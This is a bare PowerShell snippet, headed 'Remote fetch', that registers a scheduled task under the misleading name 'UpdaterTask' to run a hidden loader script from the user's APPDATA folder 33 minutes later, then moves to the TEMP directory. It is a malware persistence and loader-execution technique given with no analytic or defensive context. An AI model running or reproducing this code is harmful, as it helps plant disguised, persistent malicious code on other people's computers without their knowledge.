
<# Remote fetch #> $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "powershell.exe -NoP -File `"$env:APPDATA\loader.ps1`""; $TaskTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(33); Register-ScheduledTask -TaskName "UpdaterTask" -Action $TaskAction -Trigger $TaskTrigger -Force; Set-Location -Path $env:TEMP
